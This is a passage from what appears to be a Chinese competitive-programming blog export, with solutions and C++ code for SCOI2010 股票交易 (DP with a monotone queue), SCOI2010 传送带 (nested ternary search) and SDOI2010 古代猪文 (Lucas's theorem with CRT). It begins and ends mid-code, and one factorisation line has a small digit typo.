<span class="string">&quot;#&quot;</span>;</span><br><span class="line">                    getReads = std::<span class="built_in">make_tuple</span>(<span class="string">&quot;#&quot;</span>, <span class="literal">false</span>, std::<span class="built_in">get</span>&lt;<span class="number">2</span>&gt;(getReads) + <span class="number">1</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> std::cout &lt;&lt; std::<span class="built_in">get</span>&lt;<span class="number">0</span>&gt;(getReads);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> XEDEBUG</span></span><br><span class="line">    <span class="built_in">fclose</span>(stdin);</span><br><span class="line">    <span class="built_in">fclose</span>(stdout);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>2022</tag>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>「SCOI2010」股票交易 - 背包 DP + 单调队列</title>
    <url>/scoi2010-trade/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2569">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10183">LibreOJ 链接</a></p>
<p>最近 <span class="math inline">\(\text{lxhgww}\)</span>
又迷上了投资股票，通过一段时间的观察和学习，他总结出了股票行情的一些规律。</p>
<p>通过一段时间的观察，<span
class="math inline">\(\text{lxhgww}\)</span> 预测到了未来 <span
class="math inline">\(T\)</span> 天内某只股票的走势，第 <span
class="math inline">\(i\)</span> 天的股票买入价为每股 <span
class="math inline">\(AP_i\)</span>，第 <span
class="math inline">\(i\)</span> 天的股票卖出价为每股 <span
class="math inline">\(BP_i\)</span>（数据保证对于每个 <span
class="math inline">\(i\)</span>，都有 <span class="math inline">\(AP_i
\geq BP_i\)</span>），但是每天不能无限制地交易，于是股票交易所规定第
<span class="math inline">\(i\)</span> 天的一次买入至多只能购买 <span
class="math inline">\(AS_i\)</span> 股，一次卖出至多只能卖出 <span
class="math inline">\(BS_i\)</span> 股。</p>
<p>另外，股票交易所还制定了两个规定。为了避免大家疯狂交易，股票交易所规定在两次交易（某一天的买入或者卖出均算是一次交易）之间，至少要间隔
<span class="math inline">\(W\)</span> 天，也就是说如果在第 <span
class="math inline">\(i\)</span> 天发生了交易，那么从第 <span
class="math inline">\(i+1\)</span> 天到第 <span
class="math inline">\(i+W\)</span>
天，均不能发生交易。同时，为了避免垄断，股票交易所还规定在任何时间，一个人的手里的股票数不能超过
<span class="math inline">\(\text{MaxP}\)</span>。</p>
<p>在第 <span class="math inline">\(1\)</span> 天之前，<span
class="math inline">\(\text{lxhgww}\)</span>
手里有一大笔钱（可以认为钱的数目无限），但是没有任何股票，当然，<span
class="math inline">\(T\)</span> 天以后，<span
class="math inline">\(\text{lxhgww}\)</span>
想要赚到最多的钱，聪明的程序员们，你们能帮助他吗？</p>
<p><span class="math inline">\(0\leq W&lt;T\leq
2000,1\leq\text{MaxP}\leq2000,1\leq BP_i\leq AP_i\leq 1000,1\leq
AS_i,BS_i\leq\text{MaxP}\)</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>本题可通过背包 DP 解决。</p>
<p>显然我们可以定义状态 <span class="math inline">\(f_{i,
j}\)</span>，表示在第 <span class="math inline">\(i\)</span> 天有 <span
class="math inline">\(j\)</span> 张股票所拥有的最多钱数。</p>
<p>于是我们可以有下列 <span class="math inline">\(3\)</span>
中情况：</p>
<ol type="1">
<li>不买不卖：<span class="math inline">\(f_{i, j} = \max\{f_{i, j},
f_{i - 1, j}\}\)</span></li>
<li>买股票：<span class="math inline">\(f_{i, j} = \max\{f_{i, j}, f_{i
- w - 1, k} + \text{ap}_i * (k - j)\} \quad k \in [j - \text{as}_i,
j)\)</span></li>
<li>卖股票：<span class="math inline">\(f_{i, j} = \max\{f_{i, j}, f_{i
- w - 1, k} + \text{bp}_i * (k - j)\} \quad k \in (j, j +
\text{bs}_i]\)</span></li>
</ol>
<p>初始状态为下列两种：</p>
<ol type="1">
<li>直接买：<span class="math inline">\(f_{i, j} = -\text{ap}_i \times j
\quad j \in [0, \text{as}_i]\)</span></li>
<li>不买：除直接买外情况外 <span class="math inline">\(f_{i, j} =
-\infty\)</span></li>
</ol>
<p>但直接进行 DP 时间复杂度为 <span
class="math inline">\(O(n^3)\)</span>，肯定无法通过本题。</p>
<p>观察状态转移方程，我们可以发现该方程可用单调队列优化。</p>
<p>对于状态转移方程：</p>
<p><span class="math display">\[
f_{i, j} = \max
\begin{cases}
f_{i - 1, j} \\
\max\{f_{i - w - 1, k} + \text{ap}_i * (k - j)\} &amp; k \in [j -
\text{as}_i, j) \\
\max\{f_{i - w - 1, k} + \text{bp}_i * (k - j)\} &amp; k \in (j, j +
\text{bs}_i]
\end{cases}
\]</span></p>
<p>通过简单代数变化可转化为：</p>
<p><span class="math display">\[
f_{i, j} = \max
\begin{cases}
f_{i - 1, j} \\
\max\{f_{i - w - 1, k} + \text{ap}_i * k\} - \text{ap}_i * j &amp; k \in
[j - \text{as}_i, j) \\
\max\{f_{i - w - 1, k} + \text{bp}_i * k\} - \text{bp}_i * j &amp; k \in
(j, j + \text{bs}_i]
\end{cases}
\]</span></p>
<p>由于 <span class="math inline">\(\max\{f_{i - w - 1, k} + \text{ap}_i
* k\}\)</span> 和 <span class="math inline">\(\max\{f_{i - w - 1, k} +
\text{bp}_i * k\}\)</span> 与 <span class="math inline">\(j\)</span>
无关，故对于任何 <span
class="math inline">\(j\)</span>，该式解出的值相等。于是我们可以用单调队列预处理该式。优化掉
<span class="math inline">\(k\)</span> 这个维度，于是将复杂度优化到
<span class="math inline">\(O(n^2)\)</span>。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstdio&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;algorithm&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;queue&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">2000</span>, INF = <span class="number">0x3f3f3f3f</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">MonotoneQueue</span> &#123;</span><br><span class="line">    std::deque&lt;T&gt; q, m;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">push</span><span class="params">(<span class="type">const</span> T &amp;x)</span> </span>&#123;</span><br><span class="line">        q.<span class="built_in">push_back</span>(x);</span><br><span class="line">        <span class="keyword">while</span> (!m.<span class="built_in">empty</span>() &amp;&amp; m.<span class="built_in">back</span>() &lt; x) m.<span class="built_in">pop_back</span>();</span><br><span class="line">        m.<span class="built_in">push_back</span>(x);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        T x = q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop_front</span>();</span><br><span class="line">        <span class="keyword">if</span> (x == m.<span class="built_in">front</span>()) m.<span class="built_in">pop_front</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function">T <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> m.<span class="built_in">front</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> t, maxp, w;</span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> ap[MAXN + <span class="number">1</span>], bp[MAXN + <span class="number">1</span>], as[MAXN + <span class="number">1</span>], bs[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d&quot;</span>, &amp;t, &amp;maxp, &amp;w);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; i++) &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d %d %d %d&quot;</span>, &amp;ap[i], &amp;bp[i], &amp;as[i], &amp;bs[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">int</span> f[MAXN + <span class="number">1</span>][MAXN + <span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memset</span>(f, <span class="number">0xcf</span>, <span class="built_in">sizeof</span>(f));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= t; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= as[i]; j++) f[i][j] = -ap[i] * j;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= maxp; j++) f[i][j] = std::<span class="built_in">max</span>(f[i][j], f[i - <span class="number">1</span>][j]);</span><br><span class="line"></span><br><span class="line">        MonotoneQueue&lt; std::pair&lt;<span class="type">int</span>, <span class="type">int</span>&gt; &gt; buy, sell;</span><br><span class="line">        <span class="keyword">while</span> (!buy.<span class="built_in">empty</span>()) buy.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">while</span> (!sell.<span class="built_in">empty</span>()) sell.<span class="built_in">pop</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (i - w - <span class="number">1</span> &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= maxp; j++) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!buy.<span class="built_in">empty</span>() &amp;&amp; buy.<span class="built_in">top</span>().second &lt; j - as[i]) buy.<span class="built_in">pop</span>();</span><br><span class="line">                buy.<span class="built_in">push</span>( std::<span class="built_in">make_pair</span>(f[i - w - <span class="number">1</span>][j] + j * ap[i], j) );</span><br><span class="line">                f[i][j] = std::<span class="built_in">max</span>(f[i][j], buy.<span class="built_in">top</span>().first - j * ap[i]);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = maxp; j &gt;= <span class="number">0</span>; j--) &#123;</span><br><span class="line">                <span class="keyword">while</span> (!sell.<span class="built_in">empty</span>() &amp;&amp; sell.<span class="built_in">top</span>().second &gt; j + bs[i]) sell.<span class="built_in">pop</span>();</span><br><span class="line">                sell.<span class="built_in">push</span>( std::<span class="built_in">make_pair</span>(f[i - w - <span class="number">1</span>][j] + j * bp[i], j) );</span><br><span class="line">                f[i][j] = std::<span class="built_in">max</span>(f[i][j], sell.<span class="built_in">top</span>().first - j * bp[i]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> ans = -INF;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt;= maxp; i++) ans = std::<span class="built_in">max</span>(ans, f[t][i]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, ans);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>DP</tag>
        <tag>省选</tag>
        <tag>2010</tag>
        <tag>单调队列</tag>
        <tag>SCOI</tag>
        <tag>背包 DP</tag>
      </tags>
  </entry>
  <entry>
    <title>「SCOI2010」传送带 - 三分</title>
    <url>/scoi2010-walk/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2571">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10017">LibreOJ 链接</a></p>
<p>在一个 <span class="math inline">\(2\)</span>
维平面上有两条传送带，每一条传送带可以看成是一条线段。两条传送带分别为线段
<span class="math inline">\(\text{AB}\)</span> 和线段 <span
class="math inline">\(\text{CD}\)</span>。lxhgww 在 <span
class="math inline">\(\text{AB}\)</span> 上的移动速度为 <span
class="math inline">\(P\)</span>，在 <span
class="math inline">\(CD\)</span> 上的移动速度为 <span
class="math inline">\(Q\)</span>，在平面上的移动速度 <span
class="math inline">\(R\)</span>。现在 lxhgww 想从 <span
class="math inline">\(\text A\)</span> 点走到 <span
class="math inline">\(\text D\)</span>
点，他想知道最少需要走多长时间。</p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p>我们先忽略 <span class="math inline">\(\text{CD}\)</span>
线段，很明显我们在 <span class="math inline">\(\text{AB}\)</span>
上行走的距离与时间呈现一个单谷函数，故我们可以使用三分解决该问题。</p>
<p>接下来我们考虑 <span class="math inline">\(\text{CD}\)</span>
线段，这时候我们可以用三分套三分来解决该问题。第一个三分解决在哪个位置从
<span class="math inline">\(\text{AB}\)</span>
下来，下来后的坐标可利用第二个三分求从该坐标出发到 <span
class="math inline">\(\text D\)</span> 的最短时间，即在哪从地面上到
<span class="math inline">\(\text{CD}\)</span>。时间复杂度为 <span
class="math inline">\(O(\log_3^2 n)\)</span></p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;utility&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">double</span> ax, ay, bx, by;</span><br><span class="line"><span class="type">double</span> cx, cy, dx, dy;</span><br><span class="line"><span class="type">double</span> p, q, rr;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">dis</span><span class="params">(std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; a, std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; b)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">sqrt</span>(<span class="built_in">pow</span>(a.first - b.first, <span class="number">2</span>) + <span class="built_in">pow</span>(a.second - b.second, <span class="number">2</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">solveCD</span><span class="params">(<span class="type">double</span> x, <span class="type">double</span> y)</span> </span>&#123;</span><br><span class="line">    std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; l = std::<span class="built_in">make_pair</span>(cx, cy), r = std::<span class="built_in">make_pair</span>(dx, dy);</span><br><span class="line">    std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; lMid, rMid;</span><br><span class="line">    <span class="type">double</span> lVal = <span class="number">-100</span>, rVal = <span class="built_in">dis</span>(std::<span class="built_in">make_pair</span>(ax, ay), std::<span class="built_in">make_pair</span>(dx, dy)) / rr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (std::<span class="built_in">abs</span>(rVal - lVal) &gt;= <span class="number">0.000001</span>) &#123;</span><br><span class="line">        lMid = std::<span class="built_in">make_pair</span>(l.first + (r.first - l.first) / <span class="number">3.0</span>, l.second + (r.second - l.second) / <span class="number">3.0</span>);</span><br><span class="line">        rMid = std::<span class="built_in">make_pair</span>(l.first + (r.first - l.first) / <span class="number">1.5</span>, l.second + (r.second - l.second) / <span class="number">1.5</span>);</span><br><span class="line">        lVal = <span class="built_in">dis</span>(lMid, std::<span class="built_in">make_pair</span>(x, y)) / rr + <span class="built_in">dis</span>(lMid, std::<span class="built_in">make_pair</span>(dx, dy)) / q;</span><br><span class="line">        rVal = <span class="built_in">dis</span>(rMid, std::<span class="built_in">make_pair</span>(x, y)) / rr + <span class="built_in">dis</span>(rMid, std::<span class="built_in">make_pair</span>(dx, dy)) / q;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lVal &gt; rVal) l = lMid;</span><br><span class="line">        <span class="keyword">if</span> (lVal &lt; rVal) r = rMid;</span><br><span class="line">        <span class="keyword">if</span> (lVal == rVal) l = lMid, r = rMid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">double</span> <span class="title">solveAB</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; l = std::<span class="built_in">make_pair</span>(ax, ay), r = std::<span class="built_in">make_pair</span>(bx, by);</span><br><span class="line">    std::pair&lt;<span class="type">double</span>, <span class="type">double</span>&gt; lMid, rMid;</span><br><span class="line">    <span class="type">double</span> lVal = <span class="number">-100</span>, rVal = <span class="built_in">dis</span>(std::<span class="built_in">make_pair</span>(ax, ay), std::<span class="built_in">make_pair</span>(bx, by)) / p;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (std::<span class="built_in">abs</span>(rVal - lVal) &gt;= <span class="number">0.000001</span>) &#123;</span><br><span class="line">        lMid = std::<span class="built_in">make_pair</span>(l.first + (r.first - l.first) / <span class="number">3.0</span>, l.second + (r.second - l.second) / <span class="number">3.0</span>);</span><br><span class="line">        rMid = std::<span class="built_in">make_pair</span>(l.first + (r.first - l.first) / <span class="number">1.5</span>, l.second + (r.second - l.second) / <span class="number">1.5</span>);</span><br><span class="line">        lVal = <span class="built_in">dis</span>(lMid, std::<span class="built_in">make_pair</span>(ax, ay)) / p + <span class="built_in">solveCD</span>(lMid.first, lMid.second);</span><br><span class="line">        rVal = <span class="built_in">dis</span>(rMid, std::<span class="built_in">make_pair</span>(ax, ay)) / p + <span class="built_in">solveCD</span>(rMid.first, rMid.second);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (lVal &gt; rVal) l = lMid;</span><br><span class="line">        <span class="keyword">if</span> (lVal &lt; rVal) r = rMid;</span><br><span class="line">        <span class="keyword">if</span> (lVal == rVal) l = lMid, r = rMid;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> lVal;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    std::cin &gt;&gt; ax &gt;&gt; ay &gt;&gt; bx &gt;&gt; by;</span><br><span class="line">    std::cin &gt;&gt; cx &gt;&gt; cy &gt;&gt; dx &gt;&gt; dy;</span><br><span class="line">    std::cin &gt;&gt; p &gt;&gt; q &gt;&gt; rr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f\n&quot;</span>, <span class="built_in">solveAB</span>());</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>OI</category>
        <category>题解</category>
      </categories>
      <tags>
        <tag>OI</tag>
        <tag>题解</tag>
        <tag>省选</tag>
        <tag>2010</tag>
        <tag>SCOI</tag>
        <tag>三分</tag>
      </tags>
  </entry>
  <entry>
    <title>「SDOI2010」古代猪文 - 数论 + Lucas 定理</title>
    <url>/sdoi2010-ancient/</url>
    <content><![CDATA[<h1 id="题意描述">题意描述</h1>
<p><a href="https://www.luogu.com.cn/problem/P2480">洛谷链接</a></p>
<p><a href="https://loj.ac/p/10229">LibreOJ 链接</a></p>
<p>给定整数 <span class="math inline">\(g\)</span>，<span
class="math inline">\(n\)</span>（<span class="math inline">\(1 \leq q,
n \leq 10^9\)</span>），计算：</p>
<p><span class="math display">\[
g^{\sum_{d|n}{C_{n}^{d}}} \operatorname{mod} 999911659
\]</span></p>
<span id="more"></span>
<h1 id="解题思路">解题思路</h1>
<p><span class="math inline">\(999911659\)</span> 为质数，显然与 <span
class="math inline">\(g\)</span> 互质。</p>
<p>对于该式，我们可以用欧拉定理推论转化为：</p>
<p><span class="math display">\[
g^{\sum_{d|n}{C_{n}^{d}} \bmod \varphi(999911659)} \bmod 999911659 \\
= g^{\sum_{d|n}{C_{n}^{d}} \bmod 999911658} \bmod 999911659
\]</span></p>
<p>于是该题可转化为求出 <span
class="math inline">\(\sum_{d|n}{C_{n}^{d}} \operatorname{mod}
999911658\)</span>。</p>
<p>我们将 <span class="math inline">\(999911658\)</span>
分解质因数，可得 <span class="math inline">\(888811658 = 2 \times 3
\times 4679 \times 35617\)</span>，其中没有相同的质因数。</p>
<p>于是对于方程 <span class="math inline">\(x \equiv
\sum_{d|n}{C_{n}^{d}} \pmod
{999911658}\)</span>，显然对于下列同余方程组：</p>
<p><span class="math display">\[
\begin{cases}
x \equiv \sum_{d|n}{C_{n}^{d}} \pmod {2} \\
x \equiv \sum_{d|n}{C_{n}^{d}} \pmod {3} \\
x \equiv \sum_{d|n}{C_{n}^{d}} \pmod {4679} \\
x \equiv \sum_{d|n}{C_{n}^{d}} \pmod {35617}
\end{cases}
\]</span></p>
<p>其中 <span class="math inline">\(x\)</span> 的解即为方程 <span
class="math inline">\(x \equiv \sum_{d|n}{C_{n}^{d}} \pmod
{999911658}\)</span> 的解。</p>
<p>我们先对 <span class="math inline">\(n\)</span>
分解质因数，再用中国剩余定理求出该方程组的解，用 Lucas
定理和预处理阶乘及逆元优化求解 <span class="math inline">\(C_{n}^{d}
\bmod p\)</span>。最终利用快速幂求出 <span class="math inline">\(g^x
\bmod 999911659\)</span> 即得出答案。</p>
<h1 id="代码演示">代码演示</h1>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">int</span> MAXN = <span class="number">35617</span>, MOD = <span class="number">999911659</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="type">long</span> fact[MAXN + <span class="number">1</span>], inv[MAXN + <span class="number">1</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">power</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x, <span class="type">long</span> <span class="type">long</span> y, <span class="type">long</span> <span class="type">long</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> re = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (y) &#123;</span><br><span class="line">        <span class="keyword">if</span> (y &amp; <span class="number">1</span>) re = (re * x) % p;</span><br><span class="line">        x = (x * x) % p;</span><br><span class="line">        y &gt;&gt;= <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> re;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">C</span><span class="params">(<span class="type">long</span> <span class="type">long</span> x, <span class="type">long</span> <span class="type">long</span> y, <span class="type">long</span> <span class="type">long</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; y) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> ((fact[x] * inv[y]) % p * inv[x - y]) % p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">lucas</span><span class="params">(<span class="type">long</span> <span class="type">long</span> n, <span class="type">long</span> <span class="type">long</span> m, <span class="type">long</span> <span class="type">long</span> p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; m) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (!n) <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">lucas</span>(n / p, m / p, p) * <span class="built_in">C</span>(n % p, m % p, p)) % p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">exgcd</span><span class="params">(<span class="type">long</span> <span class="type">long</span> a, <span class="type">long</span> <span class="type">long</span> b, <span class="type">long</span> <span class="type">long</span> &amp;x, <span class="type">long</span> <span class="type">long</span> &amp;y)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!b) &#123;</span><br><span class="line">        x = <span class="number">1</span>;</span><br><span class="line">        y = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> d = <span class="built_in">exgcd</span>(b, a % b, x, y);</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> t = x;</span><br><span class="line">    x = y;</span><br><span class="line">    y = t - (a / b) * y;</span><br><span class="line">    <span class="keyword">return</span> d;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">long</span> <span class="type">long</span> <span class="title">crt</span><span class="params">(<span class="type">int</span> k, <span class="type">long</span> <span class="type">long</span>* a, <span class="type">long</span> <span class="type">long</span>* r)</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n = <span class="number">1</span>, ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) n = n * r[i];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= k; i++) &#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> m = n / r[i], b, y;</span><br><span class="line">        <span class="built_in">exgcd</span>(m, r[i], b, y);</span><br><span class="line">        ans = (ans + a[i] * m * b % n) % n;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> (ans % n + n) % n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">init</span><span class="params">(<span class="type">int</span> p)</span> </span>&#123;</span><br><span class="line">    fact[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = <span class="number">1</span>; i &lt;= p; i++) &#123;</span><br><span class="line">        fact[i] = (fact[i - <span class="number">1</span>] * i) % p;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    inv[p - <span class="number">1</span>] = <span class="built_in">power</span>(fact[p - <span class="number">1</span>], p - <span class="number">2</span>, p);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> i = p - <span class="number">2</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        inv[i] = (inv[i + <span class="number">1</span>] * (i + <span class="number">1</span>)) % p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> n, g;</span><br><span class="line"></span><br><span class="line">    std::cin &gt;&gt; n &gt;&gt; g;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (g == MOD) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;0&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">static</span> <span class="type">long</span> <span class="type">long</span> f[<span class="number">5</span>] = &#123; <span class="number">-1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4679</span>, <span class="number">35617</span> &#125;, a[<span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">4</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">init</span>(f[i]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">long</span> <span class="type">long</span> d = <span class="number">1</span>; d * d &lt;= n; d++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (n % d == <span class="number">0</span>) &#123;</span><br><span class="line">                a[i] = (a[i] + <span class="built_in">lucas</span>(n, d, f[i])) % f[i];</span><br><span class="line">                <span class="keyword">if</span> (d * d != n) &#123;</span><br><span class="line">                    a[i] = (a[i] + <span class="built_in">lucas</span>(n, n / d, f[i])) % f[i];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    std::cout &lt;&lt; <span class="built_in">power</span>(g, <span class="built_in">crt</span>(<span class="number">4</span>, a, f), 